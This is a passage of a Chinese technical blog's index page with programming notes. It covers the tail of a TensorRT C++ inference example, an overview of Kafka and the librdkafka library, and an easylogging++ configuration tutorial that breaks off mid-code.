std::ios::binary)</span></span>;</span><br><span class="line">    trtModelStream.<span class="built_in">seekg</span>(<span class="number">0</span>, trtModelStream.end);</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> modelSize = trtModelStream.<span class="built_in">tellg</span>();</span><br><span class="line">    trtModelStream.<span class="built_in">seekg</span>(<span class="number">0</span>, trtModelStream.beg);</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">char</span>&gt; <span class="title">modelData</span><span class="params">(modelSize)</span></span>;</span><br><span class="line">    trtModelStream.<span class="built_in">read</span>(modelData.<span class="built_in">data</span>(), modelSize);</span><br><span class="line"></span><br><span class="line">    nvinfer1::ICudaEngine* engine = runtime-&gt;<span class="built_in">deserializeCudaEngine</span>(modelData.<span class="built_in">data</span>(), modelSize, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建执行上下文</span></span><br><span class="line">    nvinfer1::IExecutionContext* context = engine-&gt;<span class="built_in">createExecutionContext</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备输入数据和输出缓冲区</span></span><br><span class="line">    <span class="type">float</span> inputData[INPUT_SIZE]; <span class="comment">// INPUT_SIZE 是模型期望的输入大小</span></span><br><span class="line">    <span class="type">float</span> outputData[OUTPUT_SIZE]; <span class="comment">// OUTPUT_SIZE 是模型期望的输出大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配 GPU 内存并将输入数据传输到 GPU</span></span><br><span class="line">    <span class="type">void</span>* gpuInputBuffer;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;gpuInputBuffer, INPUT_SIZE * <span class="built_in">sizeof</span>(<span class="type">float</span>));</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(gpuInputBuffer, inputData, INPUT_SIZE * <span class="built_in">sizeof</span>(<span class="type">float</span>), cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配 GPU 内存用于输出</span></span><br><span class="line">    <span class="type">void</span>* gpuOutputBuffer;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;gpuOutputBuffer, OUTPUT_SIZE * <span class="built_in">sizeof</span>(<span class="type">float</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行推理</span></span><br><span class="line">    context-&gt;<span class="built_in">execute</span>(<span class="number">1</span>, &amp;gpuInputBuffer, &amp;gpuOutputBuffer, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将输出数据从 GPU 复制回主机</span></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(outputData, gpuOutputBuffer, OUTPUT_SIZE * <span class="built_in">sizeof</span>(<span class="type">float</span>), cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理输出数据...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理资源</span></span><br><span class="line">    <span class="built_in">cudaFree</span>(gpuInputBuffer);</span><br><span class="line">    <span class="built_in">cudaFree</span>(gpuOutputBuffer);</span><br><span class="line">    context-&gt;<span class="built_in">destroy</span>();</span><br><span class="line">    engine-&gt;<span class="built_in">destroy</span>();</span><br><span class="line">    runtime-&gt;<span class="built_in">destroy</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请注意，实际的使用场景可能会更加复杂，具体的实现可能需要更多的代码，特别是在处理不同类型和形状的输入数据时。确保查阅 TensorRT 的文档和示例，以获得详细的使用说明。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Kafka/kafka_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/2024-05-22-kafka_1_1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Kafka/kafka_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/2024-05-22-kafka_1_1/" class="post-title-link" itemprop="url">kafka_1_1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kafka/" itemprop="url" rel="index"><span itemprop="name">Kafka</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>kafka相关的理论基础知识</li>
</ul>
<h2 id="维基百科-Kafka是什么"><a href="#维基百科-Kafka是什么" class="headerlink" title="维基百科 Kafka是什么"></a>维基百科 Kafka是什么</h2><ul>
<li><p>Kafka是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。该项目的目标是为处理实时数据提供一个统一、高吞吐、低延迟的平台。其持久化层本质上是一个“按照分布式事务日志架构的大规模发布&#x2F;订阅消息队列”，[4]这使它作为企业级基础设施来处理流式数据非常有价值。此外，Kafka可以通过Kafka Connect连接到外部系统（用于数据输入&#x2F;输出），并提供了Kafka Streams——一个Java流式处理库。</p>
</li>
<li><p>Kafka的历史</p>
<ul>
<li>Kafka最初是由领英开发，并随后于2011年初开源，并于2012年10月23日由Apache Incubator孵化出站。2014年11月，几个曾在领英为Kafka工作的工程师，创建了名为Confluent的新公司，[6]，并着眼于Kafka。根据2014年Quora的帖子，Jay Kreps似乎已经将它以作家弗朗茨·卡夫卡命名。Kreps选择将该系统以一个作家命名是因为，它是“一个用于优化写作的系统”，而且他很喜欢卡夫卡的作品</li>
</ul>
</li>
<li><p>Kafka的架构</p>
<ul>
<li>Kafka存储的消息来自任意多被称为“生产者”（Producer）的进程。数据从而可以被分配到不同的“分区”（Partition）、不同的“Topic”下。在一个分区内，这些消息被索引并连同时间戳存储在一起。其它被称为“消费者”（Consumer）的进程可以从分区查询消息。Kafka运行在一个由一台或多台服务器组成的集群上，并且分区可以跨集群结点分布。</li>
<li>Kafka高效地处理实时流式数据，可以实现与Storm、HBase和Spark的集成。作为聚类部署到多台服务器上，Kafka处理它所有的发布和订阅消息系统使用了四个API，即生产者API、消费者API、Stream API和Connector API。它能够传递大规模流式消息，自带容错功能，已经取代了一些传统消息系统，如JMS、AMQP等。</li>
<li>Kafka架构的主要术语包括Topic、Record和Broker。Topic由Record组成，Record持有不同的信息，而Broker则负责复制消息。Kafka有四个主要API：<ul>
<li>生产者API：支持应用程序发布Record流。</li>
<li>消费者API：支持应用程序订阅Topic和处理Record流</li>
<li>Stream API：将输入流转换为输出流，并产生结果。</li>
<li>Connector API：执行可重用的生产者和消费者API，可将Topic链接到现有应用程序。</li>
</ul>
</li>
<li>相关术语<ul>
<li>Topic 用来对消息进行分类，每个进入到Kafka的信息都会被放到一个Topic下</li>
<li>Broker 用来实现数据存储的主机服务器</li>
<li>Partition 每个Topic中的消息会被分为若干个Partition，以提高消息的处理效率</li>
<li>Producer 消息的生产者</li>
<li>Consumer 消息的消费者</li>
<li>Consumer Group 消息的消费群组</li>
</ul>
</li>
</ul>
</li>
<li><p>Kafka的性能</p>
<ul>
<li>由于其广泛集成到企业级基础设施中，监测Kafka在规模运行中的性能成为一个日益重要的问题。监测端到端性能，要求跟踪所有指标，包括Broker、消费者和生产者。除此之外还要监测ZooKeeper，Kafka用它来协调各个消费者。[8][9]目前有一些监测平台可以追踪Kafka的性能，有开源的，如领英的Burrow；也有付费的，如Datadog。除了这些平台之外，收集Kafka的数据也可以使用工具来进行，这些工具一般需要Java，包括JConsole</li>
</ul>
</li>
</ul>
<h2 id="C-librdkafka库是什么"><a href="#C-librdkafka库是什么" class="headerlink" title="C++ librdkafka库是什么"></a>C++ librdkafka库是什么</h2><p>C++库librdkafka是一个用于Apache Kafka的客户端库。它提供了与Kafka集群通信的功能，允许你在C++应用程序中生产和消费消息。librdkafka是一个高性能的、轻量级的库，具有很好的可扩展性，因此在许多C++应用程序中被广泛使用。它提供了丰富的特性和配置选项，使得开发者能够灵活地与Kafka进行交互，例如消息的分区、压缩、认证等。</p>
<h2 id="C-librdkafka库-详解"><a href="#C-librdkafka库-详解" class="headerlink" title="C++ librdkafka库 详解"></a>C++ librdkafka库 详解</h2><p>librdkafka 是一个 C&#x2F;C++ 客户端库，用于与 Apache Kafka 通信。它提供了高性能的生产者和消费者功能，允许你在 C++ 应用程序中轻松地发送和接收消息到 Kafka 集群。</p>
<p>以下是 librdkafka 的一些关键特性和详解：</p>
<ol>
<li><p><strong>高性能</strong>：librdkafka 是一个高性能的库，它通过最大限度地减少与 Kafka 集群的网络通信以及有效地使用系统资源来提高性能。</p>
</li>
<li><p><strong>异步和批处理</strong>：librdkafka 支持异步发送和接收消息的方式，它能够批量发送和接收消息，从而提高吞吐量并减少延迟。</p>
</li>
<li><p><strong>生产者和消费者</strong>：librdkafka 提供了生产者和消费者的功能，允许你从应用程序中发送消息到 Kafka 主题，并从 Kafka 主题中接收消息。</p>
</li>
<li><p><strong>消息分区和复制</strong>：librdkafka 允许你指定消息的分区方式，以及处理消息的复制和故障转移。</p>
</li>
<li><p><strong>灵活的配置</strong>：librdkafka 提供了丰富的配置选项，允许你根据应用程序的需要对其行为进行微调，包括消息的序列化和压缩方式、日志记录级别、连接超时等。</p>
</li>
<li><p><strong>消息传递语义</strong>：librdkafka 支持不同的消息传递语义，包括最少一次传递、最多一次传递和恰好一次传递，以满足不同应用程序的需求。</p>
</li>
<li><p><strong>跨平台支持</strong>：librdkafka 支持多种操作系统，包括 Linux、Windows 和 macOS，以及多种编译器和架构。</p>
</li>
</ol>
<p>总的来说，librdkafka 是一个功能强大、高性能的 C++ 客户端库，为开发者提供了与 Kafka 集群进行可靠通信的工具，使得构建分布式消息系统变得更加容易。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_2_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-mongoose_2_1%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_2_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-mongoose_2_1%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">mongoose_2_1常用技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose网络库的常用技巧</li>
</ul>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Logger/Easylogging++/2024-05-22-easylog-01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Logger/Easylogging++/2024-05-22-easylog-01/" class="post-title-link" itemprop="url">easylog-01</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Logger/" itemprop="url" rel="index"><span itemprop="name">Logger</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="1-1-简单输出日志"><a href="#1-1-简单输出日志" class="headerlink" title="1.1 简单输出日志"></a>1.1 简单输出日志</h3><ul>
<li>示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;easylogging++.h&quot;  </span><br><span class="line">  </span><br><span class="line">INITIALIZE_EASYLOGGINGPP  </span><br><span class="line">  </span><br><span class="line">int main(int argv, char* argc[]) &#123;  </span><br><span class="line">   LOG(INFO) &lt;&lt; &quot;My first info log using default logger&quot;;  </span><br><span class="line">   return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>代码解析：<ul>
<li>包含 <code>easylogging++.h</code> 头文件</li>
<li>使用宏 <code>INITIALIZE_EASYLOGGINGPP</code> 初始化</li>
<li>使用 <code>LOG(INFO)</code> 开始日志记录</li>
</ul>
</li>
<li>注意：<ul>
<li>这里需要特别说明的是，初始化宏 <code>INITIALIZE_EASYLOGGINGPP</code> 必须使用而且只能使用一次，否则会产生编译错误。</li>
<li>最好的放置这个初始化宏的地方是位于程序入口函数所在文件的顶部，紧跟在包含头文件的代码后面</li>
</ul>
</li>
</ul>
<h3 id="1-2-接入easylogging-的两种方式"><a href="#1-2-接入easylogging-的两种方式" class="headerlink" title="1.2 接入easylogging++的两种方式"></a>1.2 接入easylogging++的两种方式</h3><ul>
<li>接入 <code>easylogging++</code> 有两种方式，两种方式都需要在你的项目中直接包含源码(<code>easylogging++.h</code> 和 <code>easylogging++.cc</code>):</li>
</ul>
<h4 id="主程序中直接初始化"><a href="#主程序中直接初始化" class="headerlink" title="主程序中直接初始化"></a>主程序中直接初始化</h4><ul>
<li>通过 <code>INITIALIZE_EASYLOGGINGPP</code> 宏初始化即可开始，例如上面<code>1.1简单输出日志</code>的示例代码</li>
</ul>
<h4 id="隐式初始化"><a href="#隐式初始化" class="headerlink" title="隐式初始化"></a>隐式初始化</h4><ul>
<li>或者也可以不直接在程序入口处添加 <code>INITIALIZE_EASYLOGGINGPP</code> 宏，改为隐式初始化，借由定义 <code>AUTO_INITIALIZE_EASYLOGGINGPP</code> 宏实现。</li>
<li>在<code>CMakeLists.txt</code>中定义宏，例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># easylogging++ 隐式声明宏</span><br><span class="line">add_definitions(-DAUTO_INITIALIZE_EASYLOGGINGPP)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-3-输出到指定日志文件"><a href="#1-3-输出到指定日志文件" class="headerlink" title="1.3 输出到指定日志文件"></a>1.3 输出到指定日志文件</h3><ul>
<li><p>通过完成 <code>Easylogging++</code> 日志的配置，才可以实现输出到指定文件</p>
</li>
<li><p>要完成 <code>Easylogging++</code> 日志的配置功能，可以通过三种方式实现，而且每一种方法都非常简单。</p>
<ul>
<li>使用配置文件，这种方法的好处就是只要修改配置文件即可实现日志格式的重新配置，而不需要修改源程序代码，缺点就是发布程序时必须打包配置文件一起发布，否则程序无法正常运行。</li>
<li>使用<code>el::Configurations</code>类提供的成员函数，这种方法和第一种方法的优缺点正好相反。</li>
<li>使用 <code>Easylogging++</code> 的内联配置功能，但是并不推荐使用这种方式，因为它会显得配置十分凌乱。</li>
</ul>
</li>
</ul>
<h4 id="1-3-1-使用配置文件"><a href="#1-3-1-使用配置文件" class="headerlink" title="1.3.1 使用配置文件"></a>1.3.1 使用配置文件</h4><ul>
<li><p>在程序运行时，可以通过使用 <code>el::Configurations</code> 类加载配置文件来完成 <code>Easylogging++</code> 的配置功能，配置文件必须遵循下面的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* LEVEL:  </span><br><span class="line">  CONFIGURATION NAME  = &quot;VALUE&quot; ## Comment  </span><br><span class="line">  CONFIGURATION NAME  = &quot;VALUE&quot;</span><br></pre></td></tr></table></figure></li>
<li><p>语法简要说明：</p>
<ul>
<li><code>*LEVEL</code>，指的是日志级别，以星号符<code>&quot;*&quot;</code>开始，并以英文冒号<code>&quot;:&quot;</code>结束。</li>
<li><code>CONFIGURATION NAME</code>， 指的是配置项的名称，全部名称见下面的表格。</li>
<li><code>&quot;VALUE&quot;</code>，指的是配置项的值，各个配置对应的值类型详见下面的表格。</li>
<li><code>##Comment</code>，指的是注释，其中两个连续井号<code>&quot;##&quot;</code>表示注释，<code>Comment</code>是注释的内容。注释是可有可无的，但是千万不要在注释中使用双引号，否则可能会出现意想不到的错误</li>
</ul>
</li>
<li><p>编写配置文件时，强烈建议先写 <code>Global</code> 级别的配置，这样的好处是可以使其他未在配置文件中明确指出的级别都将会自动继承使用 <code>Global</code> 级别的配置。</p>
</li>
<li><p>下表列举了GitHub上给出的Easylogging++在配置文件中支持的配置项：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>Configuration Name</th>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>Enabled</code></td>
<td>bool</td>
<td>确定是否启用记录器的相应级别。你可以使用’ el::Level::Global ‘禁用所有日志</td>
</tr>
<tr>
<td><code>To_File</code></td>
<td>bool</td>
<td>是否将相应的日志写入日志文件</td>
</tr>
<tr>
<td><code>To_Standard_Output</code></td>
<td>bool</td>
<td>是否将日志写入标准输出，如终端或命令提示符</td>
</tr>
<tr>
<td><code>Format</code></td>
<td>char*</td>
<td>确定相应级别和记录器的日志格式&#x2F;模式.</td>
</tr>
<tr>
<td><code>Filename</code></td>
<td>char*</td>
<td>为相应级别和日志记录器确定要写入日志的日志文件(全路径)</td>
</tr>
<tr>
<td><code>Subsecond_Precision</code></td>
<td>uint</td>
<td>指定亚秒精度(以前称为“毫秒宽度”)。宽度可在(1-6)范围内</td>
</tr>
<tr>
<td><code>Performance_Tracking</code></td>
<td>bool</td>
<td>确定是否启用性能跟踪。这与记录器或级别无关。性能跟踪总是使用’ Performance ‘记录器，除非指定</td>
</tr>
<tr>
<td><code>Max_Log_File_Size</code></td>
<td>size_t</td>
<td>如果对应级别的日志文件大小为&gt;&#x3D;指定大小，则日志文件将被截断.</td>
</tr>
<tr>
<td><code>Log_Flush_Threshold</code></td>
<td>size_t</td>
<td>指定在清除挂起的日志数据之前要保留的日志项数</td>
</tr>
</tbody></table>
<ul>
<li>配置文件示例 my_log.conf ：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">* GLOBAL:  </span><br><span class="line">    ENABLED                 =   true  </span><br><span class="line">    TO_FILE                 =   true  </span><br><span class="line">    TO_STANDARD_OUTPUT      =   true  </span><br><span class="line">    FORMAT                  =   &quot;[%level | %datetime] | %msg&quot;  </span><br><span class="line">    FILENAME                =   &quot;log\\log_%datetime&#123; %Y%M%d&#125;.log&quot;  </span><br><span class="line">    MILLISECONDS_WIDTH      =   3  </span><br><span class="line">    PERFORMANCE_TRACKING    =   false  </span><br><span class="line">    MAX_LOG_FILE_SIZE       =   1048576  </span><br><span class="line">    LOG_FLUSH_THRESHOLD     =   0  </span><br><span class="line">      </span><br><span class="line">* TRACE:  </span><br><span class="line">    FILENAME                =   &quot;log\\trace_log_%datetime&#123; %Y%M%d&#125;.log&quot;  </span><br><span class="line">      </span><br><span class="line">* DEBUG:  </span><br><span class="line">    FILENAME                =   &quot;log\\debug_log_%datetime&#123; %Y%M%d&#125;.log&quot;  </span><br><span class="line">      </span><br><span class="line">* FATAL:  </span><br><span class="line">    ENABLED                 =   false  </span><br><span class="line">      </span><br><span class="line">* ERROR:  </span><br><span class="line">    FILENAME                =   &quot;log\\error_log_%datetime&#123; %Y%M%d&#125;.log&quot;  </span><br><span class="line">      </span><br><span class="line">* WARNING:  </span><br><span class="line">    FILENAME                =   &quot;log\\warning_log_%datetime&#123; %Y%M%d&#125;.log&quot;  </span><br><span class="line">      </span><br><span class="line">* INFO:  </span><br><span class="line">    FILENAME                =   &quot;log\\info_log_%datetime&#123; %Y%M%d&#125;.log&quot;  </span><br><span class="line">      </span><br><span class="line">* VERBOSE:  </span><br><span class="line">    ENABLED                 =   false</span><br></pre></td></tr></table></figure></li>
<li>在上面的文件中，我们以 <code>Global</code> 级别开始，并在 <code>Global</code> 级别中把 <code>Easylogging++</code> 支持的所有的配置项都设置好了，这样 <code>Global</code> 级别的配置就会被后续的日志级别所继承，一直到后续的日志级别再次明确地设置配置项才会覆盖原有的来自于 <code>Global</code> 级别的配置。</li>
<li>比如这里的<code>TRACE</code>、<code>DEBUG</code>、<code>ERROR</code>、<code>WARNING</code>、<code>INFO</code>等级别都显式地定义了 <code>Filename</code> ，所以这几个级别的日志记录会各自保存在相应的文件里面。</li>
<li>而<code>FATAL、VERBOSE</code>这两个级别则显式地定义了 <code>ENABLE</code> ，并将其值设置为<code>false</code>，所以这两个级别的日志记录将会被禁用。下面的代码再次演示如何使用该配置文件（注意注释的内容）：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;easylogging++.h&quot;  </span><br><span class="line">  </span><br><span class="line">INITIALIZE_EASYLOGGINGPP  </span><br><span class="line">  </span><br><span class="line">int main(int argc, char** argv)  </span><br><span class="line">&#123;  </span><br><span class="line">    /*///////////////////////////////////////////////////////////////////////// </span><br><span class="line">    必须设置标记 LoggingFlag::StrictLogFileSizeCheck </span><br><span class="line">    否则,配置文件中MAX_LOG_FILE_SIZE = 1048576不生效 </span><br><span class="line">    /////////////////////////////////////////////////////////////////////////*/  </span><br><span class="line">    el::Loggers::addFlag(el::LoggingFlag::StrictLogFileSizeCheck);  </span><br><span class="line">  </span><br><span class="line">    el::Configurations conf(&quot;my_log.conf&quot;);  </span><br><span class="line">  </span><br><span class="line">    /// 可以单独设置某一个logger的配置  </span><br><span class="line">    el::Loggers::reconfigureLogger(&quot;default&quot;, conf);  </span><br><span class="line">  </span><br><span class="line">    /// 也可以设置全部logger的配置  </span><br><span class="line">    el::Loggers::reconfigureAllLoggers(conf);  </span><br><span class="line">  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;***** info log  *****&quot;;  </span><br><span class="line">  </span><br><span class="line">    system(&quot;pause&quot;);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="1-3-2-使用el-Configurations类的成员函数"><a href="#1-3-2-使用el-Configurations类的成员函数" class="headerlink" title="1.3.2 使用el::Configurations类的成员函数"></a>1.3.2 使用<code>el::Configurations</code>类的成员函数</h4><ul>
<li><p>参考<code>workspace/test/src/test_easylogging.cc : test_easylogging_logfile</code></p>
</li>
<li><p>在<code>Easylogging++</code>日志库中，封装了配置类<code>el::Configurations</code>，该类提供了完成日志配置功能的全部接口，建议参考该类的源码，可以查看和了解更多更详细和更全面的功能接口。</p>
</li>
<li><p>下面的代码演示了几个常用接口的用法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;easylogging++.h&quot;  </span><br><span class="line">  </span><br><span class="line">INITIALIZE_EASYLOGGINGPP  </span><br><span class="line">  </span><br><span class="line">int main(int argc, const char** argv)   </span><br><span class="line">&#123;  </span><br><span class="line">    /// 使用默认配置  </span><br><span class="line">    el::Configurations defaultConf;  </span><br><span class="line">    defaultConf.setToDefault();  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Using el::Configurations class&quot;;  </span><br><span class="line">      </span><br><span class="line">    /// 重新设置INFO级别的配置项FORMAT的值  </span><br><span class="line">    defaultConf.set(el::Level::Info,  </span><br><span class="line">        el::ConfigurationType::Format, &quot;%datetime %level %msg&quot;);  </span><br><span class="line">    /// 重新设置配置  </span><br><span class="line">    el::Loggers::reconfigureLogger(&quot;default&quot;, defaultConf);  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Using el::Configurations class&quot;;  </span><br><span class="line">  </span><br><span class="line">    // 重新设置GLOBAL级别的配置项FORMAT的值  </span><br><span class="line">    defaultConf.setGlobally(  </span><br><span class="line">        el::ConfigurationType::Format, &quot;%datetime %msg&quot;);  </span><br><span class="line">    /// 重新设置配置  </span><br><span class="line">    el::Loggers::reconfigureLogger(&quot;default&quot;, defaultConf);  </span><br><span class="line">    LOG(INFO) &lt;&lt; &quot;Using el::Configurations class&quot;;  </span><br><span class="line">  </span><br><span class="line">    system(&quot;pause&quot;);  </span><br><span class="line">    return 0;  